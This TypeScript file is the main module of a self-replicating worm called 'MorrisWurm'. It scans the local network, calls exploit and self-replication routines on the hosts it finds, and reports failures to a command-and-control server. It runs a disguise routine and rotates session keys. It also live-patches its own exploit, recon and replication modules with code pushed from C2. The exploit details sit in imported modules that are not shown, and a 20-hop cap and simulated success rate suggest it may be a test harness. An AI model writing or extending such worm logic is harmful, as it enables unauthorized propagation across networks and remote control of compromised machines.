import * as recon from './modules/recon';
// Import the entire module as a namespace to allow for dynamic patching
import * as exploit from './modules/exploit';
import * as replication from './modules/replication';
import { reportFailure } from './modules/c2';
import { generateKey, rotateKey } from './modules/crypto';
import { initializeConnector } from './modules/connector';
import { logger, startDisguise } from './utils';
import vm from 'vm';

const EXPLOIT_SUCCESS_RATE = 0.3; // 30% chance of success

const applyMutation = (mutatedCode: string | null): void => {
    if (!mutatedCode) {
        return;
    }
    try {
        logger.info('Module [Mutation]: Applying new code received from C2...');

        // Create a secure sandbox. Only expose necessary, safe globals.
        const sandbox = {
            logger,
            console,
            setTimeout,
            // Expose any other safe utilities the mutation might need.
        };
        vm.createContext(sandbox);

        // A map of all modules that are designed to be patchable at runtime.
        const patchableModules: { [key: string]: any } = {
            exploit,
            recon,
            replication,
        };

        // The code from C2 should be an expression that evaluates to an object
        // where keys are module names and values are objects of new functions.
        const script = new vm.Script(`(${mutatedCode})`);
        const newImplementationsByModule = script.runInContext(sandbox);

        for (const moduleName in newImplementationsByModule) {
            if (Object.prototype.hasOwnProperty.call(patchableModules, moduleName)) {
                const moduleToPatch = patchableModules[moduleName];
                const functionPatches = newImplementationsByModule[moduleName];
                Object.assign(moduleToPatch, functionPatches);
                logger.info(`Module [Mutation]: Successfully applied live patch to module: '${moduleName}'.`);
            } else {
                logger.warn(`Module [Mutation]: Received patch for unknown or un-patchable module: '${moduleName}'.`);
            }
        }

    } catch (e: any) {
        logger.error(`Module [Mutation]: Failed to apply mutation: ${e.message}`);
    }
};

async function main(): Promise<void> {
    logger.info(`MorrisWurm slithering awake... [PID: ${process.pid}]`);
    startDisguise();
    initializeConnector(applyMutation);

    const BOOTSTRAP_KEY = process.env.BOOTSTRAP_KEY;
    let currentKey: string;

    if (BOOTSTRAP_KEY && /^[0-9a-fA-F]{64}$/.test(BOOTSTRAP_KEY)) {
        currentKey = BOOTSTRAP_KEY;
        logger.info('Initialized session key from BOOTSTRAP_KEY environment variable.');
    } else {
        if (BOOTSTRAP_KEY) {
            logger.warn('BOOTSTRAP_KEY environment variable is invalid (must be 64 hex characters). Generating a new random key.');
        }
        currentKey = generateKey();
    }
    
    let hopCount = 0;
    const TTL_HOPS = 20;
    let failureCount = 0;

    while (hopCount < TTL_HOPS) {
        const targets = await recon.scanLocalNet();
        for (const target of targets) {
            if (await exploit.attemptExploit(target, currentKey, EXPLOIT_SUCCESS_RATE)) {
                try {
                    await replication.selfReplicate(target);
                    hopCount++; // Only increment on successful replication
                    logger.info(`Successful hop! Count is now ${hopCount}.`);
                } catch (replicationError: any) {
                    logger.error(`Replication to ${target.ip} failed: ${replicationError.message}`);
                    await reportFailure({ type: 'replication_fail', details: replicationError.message, targetIp: target.ip }, currentKey);
                }
            } else {
                failureCount++;
                const error = exploit.getLastError();
                await reportFailure({ ...error, targetIp: target.ip }, currentKey);
                
                // Rotate key on every 3rd failure.
                if (failureCount > 0 && failureCount % 3 === 0) {
                    currentKey = rotateKey(currentKey);
                    logger.info(`Rotated session key after ${failureCount} cumulative failures.`);
                }
            }
        }
        
        if (targets.length === 0) {
            logger.info('No targets found in this cycle. Waiting before next scan.');
        }

        logger.info(`Loop tick complete. Successful hops: ${hopCount}/${TTL_HOPS}. Cumulative failures: ${failureCount}.`);
        
        await new Promise(resolve => setTimeout(resolve, 5000));
    }

    logger.info(`TTL cap of ${TTL_HOPS} reached—poof`);
    process.exit(0);
}

main().catch(err => {
    logger.error('A fatal error occurred:', err);
    process.exit(1);
});
